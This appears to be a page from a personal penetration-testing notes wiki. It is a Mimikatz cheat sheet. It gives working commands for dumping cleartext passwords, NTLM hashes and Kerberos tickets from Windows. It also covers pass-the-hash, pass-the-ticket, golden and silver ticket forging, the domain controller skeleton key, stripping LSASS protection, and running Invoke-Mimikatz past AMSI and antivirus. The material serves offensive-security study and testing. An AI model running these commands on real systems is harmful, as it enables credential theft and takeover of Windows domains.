<!DOCTYPE html>
<html lang="en"><head><title>Mimikatz :: Cardboard Iguana Security</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto Sans Mono&amp;family=Noto Sans:wght@400;700&amp;family=Noto Sans:ital,wght@0,400;0,600;1,400;1,600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Cardboard Iguana Security"/><meta property="og:title" content="Mimikatz :: Cardboard Iguana Security"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Mimikatz :: Cardboard Iguana Security"/><meta name="twitter:description" content="Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt. Use the privilege::debug command to check if you’re running with the right privileges."/><meta property="og:description" content="Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt. Use the privilege::debug command to check if you’re running with the right privileges."/><meta property="og:image:type" content="image/webp"/><meta property="og:image:alt" content="Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt. Use the privilege::debug command to check if you’re running with the right privileges."/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:url" content="https://cardboard-iguana.com/grimoire/static/social-images/..-obsidian-spells-Mimikatz.md.webp"/><meta name="twitter:image" content="https://cardboard-iguana.com/grimoire/static/social-images/..-obsidian-spells-Mimikatz.md.webp"/><meta property="og:image" content="https://cardboard-iguana.com/grimoire/static/social-images/..-obsidian-spells-Mimikatz.md.webp"/><meta property="twitter:domain" content="cardboard-iguana.com/grimoire"/><meta property="og:url" content="https://cardboard-iguana.com/grimoire/spells/Mimikatz"/><meta property="twitter:url" content="https://cardboard-iguana.com/grimoire/spells/Mimikatz"/><link rel="icon" href="../static/icon.png"/><meta name="description" content="Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt. Use the privilege::debug command to check if you’re running with the right privileges."/><meta name="generator" content="Quartz"/><link href="../index.css" rel="stylesheet" type="text/css" spa-preserve/><script src="../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../static/contentIndex.json").then(data => data.json())</script></head><body data-slug="spells/Mimikatz"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"></div><div class="center"><div class="page-header"><header><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="..//">Cardboard Iguana Security</a><p> / </p></div><div class="breadcrumb-element"><a href="../spells/">spells</a><p> / </p></div><div class="breadcrumb-element"><a href>Mimikatz</a></div></nav><div class="spacer"></div><button class="darkmode" id="darkmode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button><div class="search"><button class="search-button" id="search-button"><p>Search</p><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></button><div id="search-container"><div id="search-space"><input autocomplete="off" id="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div id="search-layout" data-preview="true"></div></div></div></div></header><div class="popover-hint"><p show-comma="true" class="content-meta"><time datetime="2025-01-03T18:19:42.896Z">Friday, January 3, 2025</time><span>6 min read</span></p><ul class="tags"><li><a href="../tags/Application/Mimikatz" class="internal tag-link">Application/Mimikatz</a></li><li><a href="../tags/AttackCycle/Reconnaissance" class="internal tag-link">AttackCycle/Reconnaissance</a></li><li><a href="../tags/AttackCycle/LateralMovement" class="internal tag-link">AttackCycle/LateralMovement</a></li><li><a href="../tags/AttackCycle/PrivEsc" class="internal tag-link">AttackCycle/PrivEsc</a></li><li><a href="../tags/OS/Windows/ActiveDirectory" class="internal tag-link">OS/Windows/ActiveDirectory</a></li><li><a href="../tags/Protocol/Kerberos" class="internal tag-link">Protocol/Kerberos</a></li><li><a href="../tags/Cryptography/Hashes/NT" class="internal tag-link">Cryptography/Hashes/NT</a></li><li><a href="../tags/Application/PsExec" class="internal tag-link">Application/PsExec</a></li><li><a href="../tags/Application/Evil-WinRM" class="internal tag-link">Application/Evil-WinRM</a></li><li><a href="../tags/Application/XFreeRDP" class="internal tag-link">Application/XFreeRDP</a></li><li><a href="../tags/OS/Windows/LSASS" class="internal tag-link">OS/Windows/LSASS</a></li><li><a href="../tags/OS/Windows/SAM" class="internal tag-link">OS/Windows/SAM</a></li><li><a href="../tags/AttackCycle/LateralMovement/SilverTickets" class="internal tag-link">AttackCycle/LateralMovement/SilverTickets</a></li><li><a href="../tags/AttackCycle/PrivEsc/GoldenTickets" class="internal tag-link">AttackCycle/PrivEsc/GoldenTickets</a></li><li><a href="../tags/AttackCycle/PrivEsc/PassTheHash" class="internal tag-link">AttackCycle/PrivEsc/PassTheHash</a></li><li><a href="../tags/AttackCycle/LateralMovement/PassTheHash" class="internal tag-link">AttackCycle/LateralMovement/PassTheHash</a></li></ul></div></div><article class="popover-hint"><p>Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt.</p>
<ul>
<li>Use the <code>privilege::debug</code> command to check if you’re running with the right privileges.</li>
<li>Use <code>log $FILENAME</code> to log all output.</li>
</ul>
<h2 id="dumping-cleartext-passwords">Dumping cleartext passwords<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#dumping-cleartext-passwords" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p>The WDigest process caches <em>cleartext</em> passwords for recently logged in users. Or at least it used to. This behavior is disabled on modern Windows systems, but can be re-enabled by a single registry edit:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="material-theme-lighter material-theme-darker"><code data-language="powershell" data-theme="material-theme-lighter material-theme-darker" style="display:grid;"><span data-line><span style="--shiki-light:#90A4AE;--shiki-dark:#EEFFFF;">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest </span><span style="--shiki-light:#39ADB5;--shiki-dark:#89DDFF;">/</span><span style="--shiki-light:#90A4AE;--shiki-dark:#EEFFFF;">v UseLogonCredential </span><span style="--shiki-light:#39ADB5;--shiki-dark:#89DDFF;">/</span><span style="--shiki-light:#90A4AE;--shiki-dark:#EEFFFF;">t REG_DWORD </span><span style="--shiki-light:#39ADB5;--shiki-dark:#89DDFF;">/</span><span style="--shiki-light:#90A4AE;--shiki-dark:#EEFFFF;">d </span><span style="--shiki-light:#F76D47;--shiki-dark:#F78C6C;">1</span></span></code></pre></figure>
<p>Once this is set, Mimikatz can dump any cleartext passwords that WDigest caches. (Obviously, this only applies to logins made <em>after</em> the registry key above is set.)</p>
<pre><code>privilege::debug
token::elevate
sekurlsa::wdigest
</code></pre>
<p>Note that accounts in the “Protected Users” group will <em>not</em> have their credentials cached, even with the above registry hack.</p>
<h2 id="pass-the-hash">Pass the hash<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#pass-the-hash" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p><a href="../spells/NTLM-hashes" class="internal alias" data-slug="spells/NTLM-hashes">NLTM hashes</a> in LSASS memory - <a href="../spells/NTLM-hashes" class="internal alias" data-slug="spells/NTLM-hashes">NLTM hashes</a> in the local SAM = <a href="../spells/NTLM-hashes" class="internal alias" data-slug="spells/NTLM-hashes">NLTM hashes</a> for domain users!</p>
<h3 id="local-sam">Local SAM<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#local-sam" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>This provides <a href="../spells/NTLM-hashes" class="internal alias" data-slug="spells/NTLM-hashes">NLTM hashes</a> for <em>local</em> users:</p>
<pre><code>privilege::debug
token::elevate
lsadump::sam
</code></pre>
<h3 id="lsass-memory">LSASS memory<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#lsass-memory" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>This provides <a href="../spells/NTLM-hashes" class="internal alias" data-slug="spells/NTLM-hashes">NLTM hashes</a> for <em>recently logged in</em> users:</p>
<pre><code>privilege::debug
token::elevate
sekurlsa::msv
</code></pre>
<p>Cached passwords are dumped as <em>plain text</em>, instead of NTHashes.</p>
<p>The LSASS process can be protected against memory-based attacks. This protection can be bypassed by loading the mimidrv.sys driver and then executing <code>!processprotect /process:lsass.exe /remove</code> from within the <a href="../spells/Mimikatz" class="internal alias" data-slug="spells/Mimikatz">Mimikatz</a> shell.</p>
<h3 id="inject-an-ntlm-hash-into-a-process">Inject an NTLM hash into a process<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#inject-an-ntlm-hash-into-a-process" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>Commands (including reverse shells, if the necessary binaries/scripts are available) can be launched from Mimikatz using the extracted NTLM hash for authentication. Note that this <em>doesn’t</em> work if your privileges are elevated (weird, right?), hence the initial <code>token::revert</code> command:</p>
<pre><code>token::revert
sekurlsa::pth /user:$TARGET_USER /domain:$TARGET_DOMAIN /ntlm:$TARGET_USER_NTLM_HASH /run:&quot;$FULL_COMMAND_INCLUDING_ARGUMENTS&quot;
</code></pre>
<p>The shell produced in this way is a bit weird, as it is actually running as the user that launched Mimikatz (which will show up if you call <a href="../spells/whoami" class="internal alias" data-slug="spells/whoami">whoami</a>, though the privileges will be those of the <code>$TARGET_USER</code>.</p>
<p>A number of Linux commands can also take <a href="../spells/NTLM-hashes" class="internal alias" data-slug="spells/NTLM-hashes">NLTM hashes</a> instead of passwords, such as <a href="../spells/XFreeRDP" class="internal alias" data-slug="spells/XFreeRDP">XFreeRDP</a>, <a href="../spells/Impacket" class="internal alias" data-slug="spells/Impacket">Impacket</a>’s PsExec, and <a href="../spells/Evil-WinRM" class="internal alias" data-slug="spells/Evil-WinRM">Evil-WinRM</a>.</p>
<h2 id="dumping-kerberos-tickets">Dumping Kerberos tickets<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#dumping-kerberos-tickets" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p>Mimikatz can dump ticket granting tickets (and session keys) from the memory of Windows’ Local Security Authority Subsystem Service (LSASS); these can then be used to for privilege elevation or lateral movement (depending on which users are active on that machine).</p>
<p>Use the <code>sekurlsa::tickets /export</code> command to dump any <a href="../spells/Kerberos" class="internal alias" data-slug="spells/Kerberos">Kerberos</a> “tickets” (really ticket + session key data structures) from LSASS’s memory as .kirbi files. Tickets are named like ID-USER-SERVICE-DOMAIN.kirbi; ticket granting tickets have a krbtgt SERVICE name. If you can find a krbtgt ticket belonging to an administrator account, then you’ve (almost) struck gold.</p>
<h2 id="pass-the-ticket-attacks">Pass the ticket attacks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#pass-the-ticket-attacks" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p>Mimikatz can extract <a href="../spells/Kerberos" class="internal alias" data-slug="spells/Kerberos">Kerberos</a> TGT/TGS tickets and session keys:</p>
<pre><code>privilege::debug
sekurlsa::tickets /export
</code></pre>
<p>Note that TGTs for all users are available if you can run as SYSTEM; these allow TGS tickets to be requested for any service the corresponding user has access to. If you’re not running as SYSTEM, then you can get TGS tickets for the <em>current</em> user, which will give you access to those services the current user has permission to use (and has accessed recently).</p>
<p>Mimikatz can then inject tickets into the current session:</p>
<pre><code>kerberos::ptt $KIRBI_FILENAME_FOR_TICKET_TO_INJECT
</code></pre>
<p>This allows the account you’re logged in as to (automatically!) “pass the ticket” and impersonate the user whose ticket you’ve harvested. The Windows built-in command klist will provide a list of currently active tickets.</p>
<h2 id="golden-and-silver-ticket-attacks">Golden and silver ticket attacks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#golden-and-silver-ticket-attacks" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p>To generate <a href="../spells/Kerberos" class="internal alias" data-slug="spells/Kerberos">Kerberos</a> <a href="../spells/Golden-and-silver-ticket-attacks" class="internal alias" data-slug="spells/Golden-and-silver-ticket-attacks">golden and silver tickets</a> using Mimikatz, begin by running the <code>lsadump::lsa /inject /name:$SERVICE</code> command to retrieve the service SID and <a href="../spells/NTLM-hashes" class="internal alias" data-slug="spells/NTLM-hashes">NTLM password hash</a> for that service. If SERVICE is krbtgt then this will allow the creation of a golden ticket, otherwise you’ll be creating a silver ticket.</p>
<p>(You can also use a user name instead of <code>$SERVICE</code>, in which case it appears that Mimikatz will just request a ticket granting ticket from the KDC as that user in the next step; this is theoretically just as noisy as a golden ticket, but looks more “normal”.)</p>
<p>To actually create and cache the ticket, use <code>Kerberos::golden /user:$USER /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /id:$TYPE</code>, where:</p>
<ul>
<li><code>$USER</code> is the user to create the ticket for (probably the one you’ve compromised).</li>
<li><code>$DOMAIN</code> is the domain to create the ticket for.</li>
<li><code>$SID</code> is the SID of the service from the previous step.</li>
<li><code>$HASH</code> is the NT hash of the service password from the previous step.</li>
<li><code>$TYPE</code> is the type of <a href="../spells/Kerberos" class="internal alias" data-slug="spells/Kerberos">Kerberos</a> ticket to create; use 500 for a golden (ticket granting) ticket, and 1103 for a service ticket.</li>
</ul>
<p>Once the ticket has been created, use <code>misc::cmd</code> to open a command prompt using the newly forged ticket.</p>
<h2 id="pass-the-key-attacks">Pass the key attacks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#pass-the-key-attacks" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p>“Pass the key” attacks rely on the fact that <a href="../spells/Kerberos" class="internal alias" data-slug="spells/Kerberos">Kerberos</a> TGTs are granted based on an encrypted timestamp, so if we can get access to these objects we can request TGTs as the corresponding user. Turns out that these also hang out in memory and can be extracted with Mimikatz:</p>
<pre><code>privilege::debug
sekurlsa::ekeys
</code></pre>
<p>These keys can be injected into a command environment just like an NTLM hash, though you need to know how they’re encrypted. For example, for an AES256 encrypted key:</p>
<pre><code>token::revert
sekurlsa::pth /user:$TARGET_USER /domain:$TARGET_DOMAIN /aes256:$TARGET_USER_KERBEROS_KEY /run:&quot;$FULL_COMMAND_INCLUDING_ARGUMENTS&quot;
</code></pre>
<p>Other options include <code>/aes128</code> and <code>/rc4</code> for those styles of encryption, though RC4 isn’t something that you’re likely to see as it’s weak and disabled by default. (Because of a historical quirk, the RC4 key is actually <em>not</em> a timestamp, but rather the user’s NTLM hash. So <em>iff</em> RC4 is enabled on a domain, then extracting a user’s NTLM hash is sufficient to request <a href="../spells/Kerberos" class="internal alias" data-slug="spells/Kerberos">Kerberos</a> TGTs as that user!)</p>
<h2 id="kdc-skeleton-key">KDC skeleton key<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#kdc-skeleton-key" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p>If Mimikatz is run on a domain controller, it can modify the authentication service’s memory using the <code>misc::skeleton</code> command to cause it to attempt to decrypt the AS-REQ using <em>both</em> the user’s NT hash <em>and</em> an NT hash of your choosing (by default <code>60BA4FCADC466C7A033C178194C03DF6</code>, which is just <code>mimikatz</code>).  This means that you can send an AS-REQ as any user using the “skeleton key” hash to gain access as that user, similar to a <a href="../spells/Golden-and-silver-ticket-attacks" class="internal alias" data-slug="spells/Golden-and-silver-ticket-attacks">golden ticket attack</a>.</p>
<p>Obviously this isn’t very persistent itself, as the skeleton key will be lost if the server is rebooted or the authentication service restarted.</p>
<h2 id="other-implementations">Other implementations<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#other-implementations" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="meterpreter">meterpreter<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#meterpreter" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="Call-Mimikatz-from-a-meterpreter-shell" data-block data-embed-alias="Call Mimikatz from a meterpreter shell"><h1>Call Mimikatz from a meterpreter shell</h1><p>Use <code>load kiwi</code> to load up <a href="../spells/Call-Mimikatz-from-a-meterpreter-shell/../../spells/Mimikatz" class="internal alias" data-slug="spells/Mimikatz">Mimikatz</a>. Sub-commands:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="meterpreter" data-theme="material-theme-lighter material-theme-darker"><code data-language="meterpreter" data-theme="material-theme-lighter material-theme-darker" style="display:grid;"><span data-line><span>kerberos         # Attempt to retrieve kerberos creds</span></span>
<span data-line><span>livessp          # Attempt to retrieve livessp creds</span></span>
<span data-line><span>mimikatz_command # Run a custom commannd</span></span>
<span data-line><span>msv              # Attempt to retrieve msv creds (hashes)</span></span>
<span data-line><span>ssp              # Attempt to retrieve ssp creds</span></span>
<span data-line><span>tspkg            # Attempt to retrieve tspkg creds</span></span>
<span data-line><span>wdigest          # Attempt to retrieve wdigest creds</span></span></code></pre></figure><a href="../spells/Call-Mimikatz-from-a-meterpreter-shell" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="pure-powershell-implementation">Pure PowerShell implementation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#pure-powershell-implementation" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="Invoke-Mimikatz" data-block data-embed-alias="Invoke-Mimikatz"><h1>Invoke-Mimikatz</h1><p><a href="../spells/Invoke-Mimikatz/../../spells/Mimikatz" class="internal alias" data-slug="spells/Mimikatz">Mimikatz</a> binaries are generally detected by AV on download these days, but fortunately there’s a PowerShell <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1" class="external" target="_blank">re-implementation available from the Empire Project<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> that can be run after bypassing AMSI.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="material-theme-lighter material-theme-darker"><code data-language="powershell" data-theme="material-theme-lighter material-theme-darker" style="display:grid;"><span data-line><span style="--shiki-light:#6182B8;--shiki-dark:#82AAFF;">Invoke-Mimikatz</span><span style="--shiki-light:#39ADB5;--shiki-dark:#89DDFF;"> -</span><span style="--shiki-light:#90A4AE;--shiki-dark:#EEFFFF;">Command </span><span style="--shiki-light:#39ADB5;--shiki-dark:#89DDFF;">'</span><span style="--shiki-light:#91B859;--shiki-dark:#C3E88D;">&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><span style="--shiki-light:#39ADB5;--shiki-dark:#89DDFF;">'</span><span style="--shiki-light:#39ADB5;--shiki-dark:#89DDFF;"> ></span><span style="--shiki-light:#90A4AE;--shiki-dark:#EEFFFF;"> C:\mkat.txt</span></span></code></pre></figure>
<p>Note that Microsoft Defender will still detect the execution of Invoke-Mimikatz and kill the hosting PowerShell process. This is why we need to redirect the output to a file.</p><a href="../spells/Invoke-Mimikatz" class="internal transclude-src">Link to original</a></blockquote><p></p></article><hr/><div class="page-footer"><div class="backlinks"><h3>Backlinks</h3><ul class="overflow"><li><a href="../journals/2021-12-07" class="internal">Ice</a></li><li><a href="../spells/Call-Mimikatz-from-a-meterpreter-shell" class="internal">Call Mimikatz from a meterpreter shell</a></li><li><a href="../spells/Invoke-Mimikatz" class="internal">Invoke-Mimikatz</a></li><li><a href="../spells/Kerberos" class="internal">Kerberos</a></li><li><a href="../spells/Mimikatz" class="internal">Mimikatz</a></li><li><a href="../spells/meterpreter" class="internal">meterpreter</a></li></ul></div></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div id="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false}"></div><button id="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
